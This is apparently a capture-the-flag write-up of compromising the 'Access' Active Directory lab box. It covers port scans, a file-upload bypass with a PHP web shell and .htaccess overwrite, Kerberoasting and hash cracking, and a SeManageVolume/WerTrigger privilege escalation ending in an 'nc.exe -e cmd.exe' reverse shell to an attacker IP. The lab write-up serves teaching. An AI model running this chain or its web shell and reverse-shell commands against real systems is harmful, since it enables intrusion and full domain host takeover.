# Access

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.201.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 14:45 +08
Nmap scan report for 192.168.201.187
Host is up (0.17s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49697/tcp open  unknown
```

This looks to be an AD machine because of Kerberos. We can do a detailed scan on the ports that matter:

```
$ sudo nmap -p 53,80,88,139,389,445 -sC -sV --min-rate 4000 192.168.201.187
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-08 14:47 +08
Nmap scan report for 192.168.201.187
Host is up (0.18s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-08 06:47:48Z)
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can take note of the domain name `access.offsec` and add it to our `/etc/hosts` file.&#x20;

### Port 80 --> File Upload Fail

Port 80 hosted an event site:

<figure><img src="../../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

The entire site looked static, except for the buy tickets part:

<figure><img src="../../../.gitbook/assets/image (3134).png" alt=""><figcaption></figcaption></figure>

We could upload files using this system. I ran a `gobuster` scan on this site and proxied traffic through Burpsuite. There weren't many interesting directories:

```
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://access.offsec -t 100 
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://access.offsec
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/07/08 14:52:46 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 339] [--> http://access.offsec/assets/]
/uploads              (Status: 301) [Size: 340] [--> http://access.offsec/uploads/]
<TRUNCATED>
```

Earlier, our detailed `nmap` scan picked up on the HTTP Server Header having 'PHP/8.0.7' within it, which means that we should be attempting to upload PHP web shells.

Attempting to upload files ending in `.php` result in this:

<figure><img src="../../../.gitbook/assets/image (95).png" alt=""><figcaption></figcaption></figure>

This is bypassable using a null byte:

<figure><img src="../../../.gitbook/assets/image (554).png" alt=""><figcaption></figcaption></figure>

However, when we view our file, it does not execute our code.&#x20;

```
$ curl http://access.offsec/uploads/cmd.php%2500 
<?php system($_REQUEST['cmd']); ?>
```

### .htaccess Overwrite --> RCE

I found this pretty weird, why would NOT be executing PHP? I googled for what can block PHP execution on websites, and it brought me to this page detailing about how the `.htaccess` file can do that:

{% embed url="https://www.wpbeginner.com/wp-tutorials/how-to-disable-php-execution-in-certain-wordpress-directories/" %}

Since we have an LFI, we can try to overwrite the current `.htaccess` file. This file sort of 'executes' for the directory it is in. So if we upload a `.htaccess` file to the `/uploads` directory allowing PHP exeuction, it should allow webshells to work within the `/uploads` directory only.&#x20;

We can upload this file:

```
<IfModule mime_module>
AddHandler php5-script .gif
SetHandler application/x-httpd-php
</IfModule>
```

<figure><img src="../../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>

Then, we can upload our PHP webshell as `cmd.gif`, which would work properly now:

<figure><img src="../../../.gitbook/assets/image (1613).png" alt=""><figcaption></figcaption></figure>

Then, we can get a reverse shell using `nc64.exe`.

<figure><img src="../../../.gitbook/assets/image (639).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Kerberoast --> svc\_mssql Shell

We cannot grab the user flag just yet. Within the `C:\Users` directory, there's another service user present:

```
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users

04/08/2022  02:40 AM    <DIR>          .
04/08/2022  02:40 AM    <DIR>          ..
05/28/2021  03:53 AM    <DIR>          Administrator
05/28/2021  03:53 AM    <DIR>          Public
02/14/2023  11:18 PM    <DIR>          svc_apache
04/08/2022  02:40 AM    <DIR>          svc_mssql
```

We can check whether this user has an SPN for us to Kerberoast using `setspn.exe`, which is a built-in Windows binary:

```
C:\Users>setspn.exe -Q */*
<TRUNCATED>
CN=krbtgt,CN=Users,DC=access,DC=offsec
        kadmin/changepw
CN=MSSQL,CN=Users,DC=access,DC=offsec
        MSSQLSvc/DC.access.offsec
```

This user is indeed kerberoastable. We don't have any credentials, so this needs to be done on the domain itself. We can use `Rubeus.exe` for this.

```
C:\Windows\Tasks>.\Rubeus.exe kerberoast /outfile:hashes.txt
```

Afterwards, we can transfer this back to our machine and crack it:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
trustno1         (?)     
1g 0:00:00:00 DONE (2023-07-08 15:11) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

The `svc_mssql` user is not part of the Remote Management Group, so we have to get a shell via `RunasCs.exe`.&#x20;

```
C:\Windows\Tasks>.\RunasCs.exe svc_mssql trustno1 whoami
.\RunasCs.exe svc_mssql trustno1 whoami
access\svc_mssql
```

Then, download another copy of `nc64.exe` and execute it to get another reverse shell:

<figure><img src="../../../.gitbook/assets/image (981).png" alt=""><figcaption></figcaption></figure>

### SeManageVolumePrivilege --> WerTrigger

This user has the SeManageVolumePrivilege enabled:

```
C:\Users\svc_mssql\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

There are repositories (including one made by the creator of this box) available to exploit this:

{% embed url="https://github.com/CsEnox/SeManageVolumeExploit" %}

When run, it gives us full permissions over the entire file system:

```
C:\Users\svc_mssql\Desktop>.\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 918
DONE 

C:\Users\svc_mssql\Desktop>icacls C:\
icacls C:\
C:\ NT AUTHORITY\SYSTEM:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(F)
    BUILTIN\Users:(OI)(CI)(RX)
    BUILTIN\Users:(CI)(AD)
    BUILTIN\Users:(CI)(IO)(WD)
    CREATOR OWNER:(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

Using this, we can actually exploit WerTrigger to get an administrator shell.&#x20;

```
C:\Users\svc_mssql\Desktop>move phoneinfo.dll C:\Windows\System32
move phoneinfo.dll C:\Windows\System32
        1 file(s) moved.

C:\Users\svc_mssql\Desktop>.\WerTrigger.exe
.\WerTrigger.exe
C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.191 21
```

<figure><img src="../../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

Rooted!
